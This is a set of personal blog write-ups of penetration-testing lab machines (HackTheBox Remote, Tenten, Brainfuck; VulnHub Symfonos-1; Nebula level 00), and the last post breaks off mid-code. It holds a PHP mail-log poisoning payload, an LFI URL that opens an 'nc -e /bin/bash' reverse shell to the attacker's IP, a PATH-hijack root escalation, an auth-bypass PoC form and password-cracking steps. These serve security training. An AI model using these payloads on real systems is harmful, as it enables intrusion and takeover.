[{"content":"Remote Machine\nRemote Machine  ip 10.10.10.180  Nmap Scan 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  21/tcp open ftp Microsoft ftpd |_ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: |_ SYST: Windows_NT 80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Home - Acme Widgets 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/tcp6 rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 2,3,4 111/udp6 rpcbind | 100003 2,3 2049/udp nfs | 100003 2,3 2049/udp6 nfs | 100003 2,3,4 2049/tcp nfs | 100003 2,3,4 2049/tcp6 nfs | 100005 1,2,3 2049/tcp mountd | 100005 1,2,3 2049/tcp6 mountd | 100005 1,2,3 2049/udp mountd | 100005 1,2,3 2049/udp6 mountd | 100021 1,2,3,4 2049/tcp nlockmgr | 100021 1,2,3,4 2049/tcp6 nlockmgr | 100021 1,2,3,4 2049/udp nlockmgr | 100021 1,2,3,4 2049/udp6 nlockmgr | 100024 1 2049/tcp status | 100024 1 2049/tcp6 status | 100024 1 2049/udp status |_ 100024 1 2049/udp6 status 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 2049/tcp open mountd 1-3 (RPC #100005)   How about some UDP port huh?\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  111/udp open|filtered rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/tcp6 rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 2,3,4 111/udp6 rpcbind | 100003 2,3 2049/udp nfs | 100003 2,3 2049/udp6 nfs | 100003 2,3,4 2049/tcp nfs | 100003 2,3,4 2049/tcp6 nfs | 100005 1,2,3 2049/tcp mountd | 100005 1,2,3 2049/tcp6 mountd | 100005 1,2,3 2049/udp mountd | 100005 1,2,3 2049/udp6 mountd | 100021 1,2,3,4 2049/tcp nlockmgr | 100021 1,2,3,4 2049/tcp6 nlockmgr | 100021 1,2,3,4 2049/udp nlockmgr | 100021 1,2,3,4 2049/udp6 nlockmgr | 100024 1 2049/tcp status | 100024 1 2049/tcp6 status | 100024 1 2049/udp status |_ 100024 1 2049/udp6 status 123/udp open|filtered ntp 137/udp open|filtered netbios-ns 138/udp open|filtered netbios-dgm 500/udp open|filtered isakmp |_ike-version: ERROR: Script execution failed (use -d to debug) 2049/udp open mountd 1-3 (RPC #100005) 4500/udp open|filtered nat-t-ike 5353/udp open|filtered zeroconf 5355/udp open|filtered llmnr   This UDP doesnt look promising.\nPotential Attack Surface  21 - FTP is sweet juicy attacking surface 80 - Web pwning? yeahhh great 111 - me no speak MS language 2049 - I rarely see this, might be sweet juicy spot.  Service recon Nuff talk, lets enum all the open port. Get to know all available surface\nFTP Crap, its nothing here. Lets move on to another service.\nWeb Since its a windows machine, so automagically its an IIS/ASP web stack. For web, i usually do recon with gobuster. This will do dir brute against hosteb web service on this machine.\n1  kali@fs0ci3ty $ gobuster dir -u http://10.10.10.180 -w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt -o gobuster/root-enum   2049 NFS So, turn it this is Samba NFS. Juicy juice! Lets enum this and lets see what we got.\nLets enum this with nmap nfs-ls script\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  ╰─λ sudo nmap -sCV --script nfs-ls nmap/nfs-ls-scan -iL ip 14:26:06 [sudo] password for kali: Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-25 14:26 EDT Nmap scan report for remote.htb (10.10.10.180) Host is up (0.34s latency). Not shown: 993 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd 80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 111/tcp open rpcbind 2-4 (RPC #100000) | nfs-ls: Volume /site_backups | access: Read Lookup NoModify NoExtend NoDelete NoExecute | PERMISSION UID GID SIZE TIME FILENAME | rwx------ 4294967294 4294967294 4096 2020-02-23T18:35:48 . | ?????????? ? ? ? ? .. | rwx------ 4294967294 4294967294 64 2020-02-20T17:16:39 App_Browsers | rwx------ 4294967294 4294967294 4096 2020-02-20T17:17:19 App_Data | rwx------ 4294967294 4294967294 4096 2020-02-20T17:16:40 App_Plugins | rwx------ 4294967294 4294967294 8192 2020-02-20T17:16:42 Config | rwx------ 4294967294 4294967294 64 2020-02-20T17:16:40 aspnet_client | rwx------ 4294967294 4294967294 49152 2020-02-20T17:16:42 bin | rwx------ 4294967294 4294967294 64 2020-02-20T17:16:42 css | rwx------ 4294967294 4294967294 152 2018-11-01T17:06:44 default.aspx |_   And we have one folder which is site_backup. To confirm this even more, lets do extend enum with msf and the script is auxiliary/scanner/nfs/nfsmount.\nEnought with enum, lets mount this to our attacking machine machine. First thing im gonna do is to change my /etc/hosts and add 10.10.10.180 remote.htb.\nNow, mount the site_backup with command sudo mount -t nfs -o vers=2 remote.htb:site_backups $PWD/nfs -o nolock\nFrom here, cd to the nfs folder and crawl to get more info in order to get the initial fothold later.\nSince this is Umbraco CMS, an Open Source .NET CMS. It is wise to read the docs. I straight away look for database and got this.\nAccording to Umbraco docs, it wil create mdf file if there is SQL Server installed on the machine and will create sdf file othrwise. Since there are no SQL server appearance during scan, lets find sdf file straightaway.\nIn AppData folder, there is Umbraco.sdf file. Using strings command, we can get to take a look what information stored inside.\nWe found the admin password hash. For this, we can crack the hash using hashcat or we can use crackstation for faster speed.\nThe password for admin is baconandcheese.\nInitial foothold For this process, the first thing i try is metasploit. Unfortunately, it a no go.\nNext, we will search umbraco on searchsploit.\nThe first exploit is the one i try earlier on msf and its failed. The third one remind me to do important enum which is to get the version of Umbraco CMS. According to mr Tom Fulton here, we can grep Umbraco version on file web.config, which we get from the NFS mount earlier\nLooks like it is version 7.12.4 and the second exploit will work,fingers cross.\nLets just searchsploit -m 46154 and this will be mirrored in our current path.\nEdit the source and change this 3 var to its value, then run this using python3 46153.py\n","description":"Remote Machine Writeup","id":0,"section":"posts","tags":["pentest","retired","hackthebox"],"title":"Remote - Retired HackTheBox Machine","uri":"https://www.faizul.me/posts/hackthebox/remote/remote-machine/"},{"content":"  Lab setup\nVMWare setup with vmnet0 and Kali as attacker attached on vmnet0.\n  IP\n192.168.43.165\n  Recon This stage we get to know our victim. Doing engagement to know which port are opened, then enumerate the available port to recognize the attacking surface.\nnmap sudo nmap -sSCV -A --script vuln -oA nmap/full-agressive -iL ip\n Opened port  22 25 80 139 445    gobuster gobuster dir -u http://192.168.43.165 -w /usr/share/wordlist/dirb/big.txt -x php,html,txt -o gobuster/enum-80\nenum4linux(smb enum) since there are smb port open, we can enum it to look further of what we can collect to gain initial foothold.\nenum4linux -a 192.168.43.165\nWe got result back where we can log into smb as anonymous and take a peek content inside.\nBefore that, i add the victim ip into my /etc/hosts as symfonos.local. From here, we can just use thunar in Network section to log into smb. other than that, we can simply use smbclient.\n1 2 3 4 5 6  Can users please stop using passwords like \u0026#39;epidioko\u0026#39;, \u0026#39;qwerty\u0026#39; and \u0026#39;baseball\u0026#39;! Next person I find using one of these passwords will be fired! -Zeus   From the anonymous smb login, we can get is the warning from piss off bos who threat to fire anyone with common password.\nLets try this to login into helios account and try to collect the loot from there instead.\nOn the smb options, set the user as helios, domain as symfonos.localdomain and we can try 3 of the password we get from the loot. Password qwerty will let us go into helios smd dir.\nFrom helios account, there are 2 files and here are the contents.\n research.txt content  1  Helios (also Helius) was the god of the Sun in Greek mythology. He was thought to ride a golden chariot which brought the Sun across the skies each day from the east (Ethiopia) to the west (Hesperides) while at night he did the return journey in leisurely fashion lounging in a golden cup. The god was famously the subject of the Colossus of Rhodes, the giant bronze statue considered one of the Seven Wonders of the Ancient World.    todo.txt content  1 2 3  1. Binge watch Dexter 2. Dance 3. Work on /h3l105   On these 2 looted files, there is nothing much interesting except we know that the responsible person love to dance, watching dexter, doping research about the god of sun and the most interesting part is /h3l105.\nWe key in this into the address bar after the ip address and we will be served into this crappy website.\nSo its actually a wordpress site. Next we going to use wpscan to enumerate this site. The attacking surface for wordpress is actually the plugin. The core wordpress is one of target but usually plugin always occur to contain interesting bugs where some of it installed, unused and left not updated.\nfire up the wpscan using this command wpscan -u http://symfonos.local/h3l105 --enumerate p -o wpscan/enumerate-plugin\nFrom this, we can recognize the Local File Inclusion vulnerability.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  [+] site-editor | Location: http://symfonos.local/h3l105/wp-content/plugins/site-editor/ | Latest Version: 1.1.1 (up to date) | Last Updated: 2017-05-02T23:34:00.000Z | | Found By: Urls In Homepage (Passive Detection) | | [!] 1 vulnerability identified: | | [!] Title: Site Editor \u0026lt;= 1.1.1 - Local File Inclusion (LFI) | References: | - https://wpvulndb.com/vulnerabilities/9044 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7422 | - https://seclists.org/fulldisclosure/2018/Mar/40 | - https://github.com/SiteEditor/editor/issues/2 | | Version: 1.1.1 (80% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://symfonos.local/h3l105/wp-content/plugins/site-editor/readme.txt   Gaining initial foothold On the searchsploit, we can get the simple POC for this which is\n44340. Simply execute searchsploit -m 44340 will mirror the exploit on current directory.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  Product: Site Editor Wordpress Plugin - https://wordpress.org/plugins/site-edit or/ Vendor: Site Editor Tested version: 1.1.1 CVE ID: CVE-2018-7422 ** CVE description ** A Local File Inclusion vulnerability in the Site Editor plugin through 1.1.1 fo r WordPress allows remote attackers to retrieve arbitrary files via the ajax_pa th parameter to editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.p hp. ** Technical details ** In site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.ph p:5, the value of the ajax_path parameter is used for including a file with PHP ’s require_once(). This parameter can be controlled by an attacker and is not p roperly sanitized. Vulnerable code: if( isset( $_REQUEST[\u0026#39;ajax_path\u0026#39;] ) \u0026amp;\u0026amp; is_file( $_REQUEST[\u0026#39;ajax_path\u0026#39;] ) \u0026amp;\u0026amp; fil e_exists( $_REQUEST[\u0026#39;ajax_path\u0026#39;] ) ){ require_once $_REQUEST[\u0026#39;ajax_path\u0026#39;]; } https://plugins.trac.wordpress.org/browser/site-editor/trunk/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?rev=1640500#L5 By providing a specially crafted path to the vulnerable parameter, a remote attacker can retrieve the contents of sensitive files on the local system. ** Proof of Concept ** http://\u0026lt;host\u0026gt;/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd   According to this, we can execute os commnad using LFI method by invoking http://\u0026lt;host\u0026gt;/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd where os command reside after ajax_path.\nFor initial access, remember the earlier available SMTP port, we going to abuse it. Basically we will do this in a nutshell : -\n Set mail from random user. In this case, im using my cool nickname Set recipient to helios Set data followed by malicious code for us to send command on attacker machine  In order to do this, we can either connect to the mail using telnet and netcat\n Netcat  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  sudo rlwrap nc -vvvv 192.168.43.194 25 Trying 192.168.43.165... Connected to 192.168.43.165. Escape character is \u0026#39;^]\u0026#39;. 220 220 symfonos.localdomain ESMTP Postfix (Debian/GNU) 500 5.5.2 Error: bad syntax 502 5.5.2 Error: command not recognized MAIL FROM: \u0026lt;mark\u0026gt; 250 2.1.0 Ok RCPT TO: Helios 250 2.1.5 Ok data 354 End data with \u0026lt;CR\u0026gt;\u0026lt;LF\u0026gt;.\u0026lt;CR\u0026gt;\u0026lt;LF\u0026gt; \u0026lt;?php system($_GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt; 250 2.0.0 Ok: queued as DD26140B94 421 4.4.2 symfonos.localdomain Error: timeout exceeded Connection closed by foreign host.    Telnet  1 2 3 4 5 6 7 8 9 10 11  telnet 192.168.43.194 25 symfonos.local [192.168.43.165] 25 (smtp) open 220 symfonos.localdomain ESMTP Postfix (Debian/GNU) mail from: fyezool 250 2.1.0 Ok rcpt to: helios 250 2.1.5 Ok data 354 End data with \u0026lt;CR\u0026gt;\u0026lt;LF\u0026gt;.\u0026lt;CR\u0026gt;\u0026lt;LF\u0026gt; \u0026lt;?php system($_GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt;   After this is done, we can use the payload on LFI os command injection.\nBefore that, setup netcat on attacker machine so we can receive get the reverse shell for privilege escalation.\n1  rlwrap nc -nvlp 4444   Then run this on browser\nhttp:symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios\u0026amp;c=nc -e /bin/bash 192.168.43.194 4444\nOnce we get the reverse shell, we can get fancy bash shell by using this command python -c 'import pty;pty.spawn(\u0026quot;/bin/bash\u0026quot;)'\nHere, we are helios.\nPrivilege Escalation To escalate into root, we can use this command to find useful command.\nfind / -user root -perm -4000 -print 2\u0026gt;/dev/null\nThis command will print out and fiter junk output from the terminal.\nWe found that /opt/statuscheck is quite weird here. We can use strings to check it out.\nThis binary call curl directly. We can use this to elevate permission and gain root.\n Escalation summary\nfrom here, we are basically : -   cd to /tmp echo shebang to curl echo /bin/bash to curl gave 755 permission on curl export /tmp to path run /opt/statuscheck  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  helios@symfonos:/tmp$ echo -n \u0026#34;#!\u0026#34; \u0026gt; curl echo -n \u0026#34;#!\u0026#34; \u0026gt; curl helios@symfonos:/tmp$ echo \u0026#34;/bin/sh\u0026#34; \u0026gt;\u0026gt; curl echo \u0026#34;/bin/sh\u0026#34; \u0026gt;\u0026gt; curl helios@symfonos:/tmp$ echo \u0026#34;/bin/sh\u0026#34; \u0026gt;\u0026gt; curl echo \u0026#34;/bin/sh\u0026#34; \u0026gt;\u0026gt; curl helios@symfonos:/tmp$ chmod 755 curl chmod 755 curl helios@symfonos:/tmp$ import PATH=/tmp:$PATH import PATH=/tmp:$PATH bash: import: command not found helios@symfonos:/tmp$ export PATH=/tmp:$PATH export PATH=/tmp:$PATH helios@symfonos:/tmp$ /opt/statuscheck /opt/statuscheck # whoami whoami root #   Flaggy flag Summary  Update wordpress installation patch patch patch be careful of choosing + install third party plugin. more plugin, more attacking surfaces check for plugin updates, patch! uninstall/disable plugin if not use, less is more! Attacking summary : LFI -\u0026gt; Mailbox poison -\u0026gt; Reverse Shell -\u0026gt; Initial foothold -\u0026gt; SUID /opt/statuscheck -\u0026gt; rooted!  References  https://infosecjohn.blog/posts/vulnhub-symfonos-1/ https://medium.com/@markonsecurity/symfonos-1-walkthrough-vulnhub-df08dbcb0d36 https://0x23b.github.io/posts/vulnhub/2019-08-08-vulnhub_symfonos1_writeup/  ","description":"Symfonos-1 Vulnhub machine series","id":1,"section":"posts","tags":["pentest","retired","hackthebox"],"title":"Symfonos-1","uri":"https://www.faizul.me/posts/vulnhub/symfonos-series/symfonos-1/symfonos-1-box/"},{"content":" 10.10.10.10  Recon Nmap As usual, i will enum this machine with nmap first\nsudo nmap -sSCV -A --script vuln -T4 -oA nmap/agressive-vuln-scan -iL ip\nThe summarized of the nmap scan is that only 2 port are available for attacking which are http 80 and 22 ssh. Once we went to the browser and visit the ip, we will b greeted by this wordpress site.\nSince it is a wordpress site, i will usually skip gobuster and nikto and straight to wpscan.\nWpscan For wpscan, main two things to enumerate are plugin and user. Plugins in wordpress is really important because outdated plugin left unpatched will open attacking surfaces for wordpress.\nenumerate user\nwpscan --url http://10.10.10.10 --enumerate u -o wpscan/enumerate-user\nUser enumeration for this site gave user takis as result.\n[i] User(s) Identified: [+] takis | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Rss Generator (Passive Detection) | Wp Json Api (Aggressive Detection) | - http://10.10.10.10/index.php/wp-json/wp/v2/users/?per_page=100\u0026amp;page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) enum plugin\nwpscan --url http://10.10.10.10 --enumerate p -o wpscan/enumerate-plugin\nFor plugin, we have one unpatched which is job-manager.\n[i] Plugin(s) Identified: [+] job-manager | Location: http://10.10.10.10/wp-content/plugins/job-manager/ | Latest Version: 0.7.25 (up to date) | Last Updated: 2015-08-25T22:44:00.000Z | | Found By: Urls In Homepage (Passive Detection) | | [!] 1 vulnerability identified: | | [!] Title: Job Manager \u0026lt;= 0.7.25 - Insecure Direct Object Reference (IDOR) | References: | - https://wpvulndb.com/vulnerabilities/8167 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-6668 | - https://vagmour.eu/cve-2015-6668-cv-filename-disclosure-on-job-manager-wordpress-plugin/ | | Version: 7.2.5 (80% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://10.10.10.10/wp-content/plugins/job-manager/readme.txt Initial Foothold / Initial access In order to get initial access, we need to understand the flow and connection of plugin to the web application function here.\nSince we foun the job-manager plugin left unpatched, i manually crawl the web app manually to enumerate more.\nOn the homepage, there is one hyperlink text to the open vacancies to the other page.\nThe Pentester job vacancy page have form which we can upload file and this can be leverage into RFI where we upload reverse shell payload on it. The form also can be tested for XSS and SQLi attack.\nBut first, lets take a look at vacancy url http://10.10.10.10/index.php/jobs/apply/8/. This url where it includes the the id os a post indicates that this might contain some other values.\nwhen we change the url into other value, the post changes.\nhttp://10.10.10.10/index.php/jobs/apply/8/\nFor this one, we can get to dig more by writing simple bash script to do enumeration.\ncurl -s http://10.10.10.10 | grep '\u0026lt;title\u0026gt;'\nWe turn this into loop and full bash script for enum.\n1 2 3 4 5 6  #!/bin/bash  for i in $(seq 1 20) do echo -n \u0026#34;$i: \u0026#34; curl -s http://10.10.10.10/index.php/jobs/apply/$i/ | grep \u0026#39;\u0026lt;title\u0026gt;\u0026#39;   Now we have the list, we can create custom wordlist for bruteforcing to confirm the file on wp-upload dir.\nTo do this, we can use cat exploit/enum-more.txt | cut -d \u0026quot; \u0026quot; -f 4 where this will give output\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  Hello Sample Auto \u0026amp;#8211; Jobs Job Register Pen Application cube Application HackerAccessGranted Application index \u0026amp;#8211; \u0026amp;#8211; \u0026amp;#8211; \u0026amp;#8211; \u0026amp;#8211;   Now, i will just tee this into new file and run gobuster against the 2017/04 folder.\ncat exploit/enum-more.txt | cut -d \u0026quot; \u0026quot; -f 4 | tee loot/custom-wordlist.txt\ngobuster dir -u http://10.10.10.10/wp-content/uploads/2017/04 -w loot/custom-wordlist.txt -x png,jpg,jpeg -o gobsuter/enum-custom-wordlist\n=============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.10.10/wp-content/uploads/2017/04 [+] Threads: 10 [+] Wordlist: loot/custom-wordlist.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: jpeg,png,jpg [+] Timeout: 10s =============================================================== 2020/08/31 08:52:12 Starting gobuster =============================================================== /cube.png (Status: 200) /HackerAccessGranted.jpg (Status: 200) =============================================================== 2020/08/31 08:52:22 Finished =============================================================== Now, we going to see what is this cube and HackerAccessGranted file about.\ncube\nHackerAccessGranted\nDownload this and we going to dissect hidden strings or anything inside.\nStrings\nSince there is no hidden strings on the file, we should use another tools called steghide.\nBasically, the image contain hidden stego function of private key ssh to the victim machine. To crack the password, we can use ssh2john and crack it using JohnTheRipper.\nFirst , we change the current private key into john format\npython /usr/share/john/ssh2john id_rsa \u0026gt; john-id_rsa\nFor future reference, the john format and normal private key format is different as shown below\nThen we can crack this using this command\nsudo john john-id_rsa --fork=4 -w /usr/share/wordlist/rockyou.txt\nWe cracked the password, it is superpassword.\nWe now try to login using the private key and cracked password as enumerated user we done earlier.\nssh -i id_rsa takis@10.10.10.10\nWe are in the system as user takis and got the user flag.\nPrivilege Escalation In order to root, we can check the permission or any special permission that user takis can do using sudo -l.\nBasically, takis can run this special /bin/fuckin on ALL command without password. Let us see what this binary contain\nSo, it can accept up to 4 arguments command. Lets try to run this as sudo and execute bash.\nsudo /bin/fuckin bash\nIt works! We are now running as root.\nSummary ","description":"Tenten Machine Writeup","id":2,"section":"posts","tags":["pentest","retired","hackthebox"],"title":"Tenten - Retired HackTheBox Machine","uri":"https://www.faizul.me/posts/hackthebox/tenten/tenten-machine/"},{"content":"Depress and isolating from other human person create a huge amount of free time for me to pursue further my passion in Cybersecurity. This time, i alocate some of it to write about my Exploit-Exercise whih you can found here\nBasically, exploit exercise have 3 main exercise which are Nebula, Protostar and Fusion. Nebula is focusing more on Privilege Escalation in Linux.\nLevel 00 Questions Alternatively, look at the find man page. To access this level, log in as level00 with the password of level00.\nLab setup First, lets login to the machine. Since i setup the lab on VMWare Workstation, i just put the machine behind NAT connection and scan the network using netdiscover.\nConnect via ssh Login using level00:level00 on ssh and we are in into the machine now.\nLets get started The first level on Nebula would be very basic Linux Privilege Escalation technique. Lets try to use find / -user flag00 -perm -4000\nQuick rundown on the command, find is the tools you can found on linux, just like locate and ls. Then, / is on the next queue which indicate that find will crawl over the root / of the filesystem.\nSince the instruction needed us to execute this on behalf of flag00, here we just indicate -user flag00 and its following permission -perm plus the value of setuid and octal of -4000.\nNow, this will create a pile of hateful output, we can filter this using -print 2\u0026gt; /dev/null. /dev/null is kinda black hole in Linux and redirect anything to it can create nice and neat filter.\nOk, we have found the binary, lets run it and get our flag shall we.\n6710313549ba4d07a1a929854c8d0ec2.png\u0026rdquo;\nWe are already become user flag00 and lets just execute getflag to get the flag and move to next level.\nExploited we managed to exploit this and reach our target\nConclusion  SUID is awesome  Reference  https://www.linuxnix.com/suid-set-suid-linuxunix/  ","description":"Exploit-Exercise level 00 writeup","id":3,"section":"posts","tags":["pentest","nebula","exploit-exercise"],"title":"Nebula level 00","uri":"https://www.faizul.me/posts/exploit-exercise/level-00/"},{"content":" 10.10.10.17  Recon Nmap Start the nmap scan with sudo nmap -sCV -T4 -oA nmap/open-ports -iL ip. This will check the open ports on targeted\nResult discussions/note  22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0) 25/tcp open smtp Postfix smtpd 110/tcp open pop3 Dovecot pop3d 143/tcp open imap Dovecot imapd 443/tcp open ssl/http nginx 1.10.0 (Ubuntu)  DNS:www.brainfuck.htb DNS:sup3rs3cr3t.brainfuck.htb DNS:brainfuck.htb    To summarized and beautify the nmap output, i filtered the output so that it is easier to analyze. There are 5 open ports which is SSH which is port 22. This service runs on latest version and doesnt contain vulnerabilities. Another 2 familiar open service are pop3 on port 25 and imap on port 110. Last we got this HTTPS port on 443. Other than that, there is list of *DNS included on nmap scan, so lets add this to our /etc/hosts.\nEnumeration Browse www.brainfuck.htb and sup3rs3cr3t.brainfuck.htb and grab whatever we can to gain initial access.\nwww.brainfuck.htb gave us hint that this web app is a Wordpress web app. Since this is HTTPS or 443, we can take a good look at certificate and inspect more.\nInitial Foothold / Initial Access Searchsploit exploit Since the vulnerabilities that appears the most on wpscan result is WP Support Plus Responsive Ticket System, lets search this on searchsploit using this command. searchsploit WP Support Plus Responsive Ticket System\nThen, get this on local directory using searchsploit -m 41006. This will copy or mirror of 41006 exploit on local directory for our usage.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  1. Description You can login as anyone without knowing password because of incorrect usage of wp_set_auth_cookie(). http://security.szurek.pl/wp-support-plus-responsive-ticket-system-713-privilege-escalation.html 2. Proof of Concept \u0026lt;form method=\u0026#34;post\u0026#34; action=\u0026#34;http://wp/wp-admin/admin-ajax.php\u0026#34;\u0026gt; Username: \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;username\u0026#34; value=\u0026#34;administrator\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;email\u0026#34; value=\u0026#34;sth\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;action\u0026#34; value=\u0026#34;loginGuestFacebook\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Login\u0026#34;\u0026gt; \u0026lt;/form\u0026gt;   The exploit for this is basically where we just need username of a valid login without password. Lets enumerate the username for login in this wordpress site.\nUsername enumeration [+] admin | Found By: Author Posts - Display Name (Passive Detection) | Confirmed By: | Rss Generator (Passive Detection) | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [+] administrator | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) Next, we going to make new html file and use the code from searchsploit to login as admin in Wordpress site. Copy this code, edit the value of value=\u0026quot;administrator\u0026quot; and action=\u0026quot;http://wp/wp-admin/admin-ajax.php\u0026quot;\n1 2 3 4 5 6  \u0026lt;form method=\u0026#34;post\u0026#34; action=\u0026#34;http://wp/wp-admin/admin-ajax.php\u0026#34;\u0026gt; Username: \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;username\u0026#34; value=\u0026#34;administrator\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;email\u0026#34; value=\u0026#34;sth\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;action\u0026#34; value=\u0026#34;loginGuestFacebook\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Login\u0026#34;\u0026gt; \u0026lt;/form\u0026gt;   After that, open this on browser and we will get this kind of output.\nPress login and we will open the brainfuck.htb site with us logged in as admin.\nSince we have SMTP, POP3 and IMAP, we going to find the setup on Wordpress plugin. Hover the cursor to Brainfuck Ltd and click theme. After that, click Plugins and we will find Easy WP SMTP\nThere is a setup with password here. We can use inspect elements to get the password.\nNext, we going to setup orestis@brainfuck.htb email on our mail client as follows.\nLogin to supers3cr3t forum and read all the gibberish talk between oretis and admin.\n Get key for decipher  compare clear text vs cipher text to get key  1 2 3 4 5 6 7 8  plaintext = \u0026#34;OrestisHackingforfunandprofit\u0026#34; ciphertext = \u0026#34;PieagnmJkoijegnbwzwxmlegrwsnn\u0026#34; key = \u0026#34;\u0026#34; for i in range(len(plaintext)): num_key = ((ord(ciphertext[i]) - ord(plaintext[i])) % 26) + 97 char_key = chr(num_key) key = key + char_key print key    - result  fuckmybrain  decrypt cipher with key on cryptii.com with result as passphrase  There you go you stupid fuck, I hope you remember your key password because I dont :) https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa  Follow link and get ssh private key  Encrypted sshkey.\n convert rsa to john using rsa2john\nfirst, git clone https://github.com/stricture/hashstack-server-plugin-jtr. then run python hashstack-server-plugin-jtr/scrapers/sshng2john id_rsa \u0026gt; ssh-key-for-john. After that, run john to crack this. sudo john --wordlist=/usr/share/wordlist/rockyou.txt loot/ssh-key-for-john | tee loot/cracked-john  1 2 3 4  Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes Cost 2 (iteration count) is 1 for all loaded hashes 3poulakia! (loot/id_rsa)   We cracked the password, now, lets login to ssh using the id_rsa and password. First, change id_rsa permission to 600 using chmod 600 id_rsa\n  ssh using rsa + key\nssh -i loot/id_rsa orestis@brainfuck.htb\n  get user\ncat users.txt\n  Priv-Esc Found this file on server. This will encrypt root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  nbits = 1024 password = open(\u0026#34;/root/root.txt\u0026#34;).read().strip() enc_pass = open(\u0026#34;output.txt\u0026#34;,\u0026#34;w\u0026#34;) debug = open(\u0026#34;debug.txt\u0026#34;,\u0026#34;w\u0026#34;) m = Integer(int(password.encode(\u0026#39;hex\u0026#39;),16)) p = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False) q = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False) n = p*q phi = (p-1)*(q-1) e = ZZ.random_element(phi) while gcd(e, phi) != 1: e = ZZ.random_element(phi) c = pow(m, e, n) enc_pass.write(\u0026#39;Encrypted Password: \u0026#39;+str(c)+\u0026#39;\\n\u0026#39;) debug.write(str(p)+\u0026#39;\\n\u0026#39;) debug.write(str(q)+\u0026#39;\\n\u0026#39;) debug.write(str(e)+\u0026#39;\\n\u0026#39;)   Some RSA encruption shit, found this cool script.\nimport binascii, base64 p = 7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307 q = 7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079 e = 30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997 ct = 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182 def egcd(a, b): x,y, u,v = 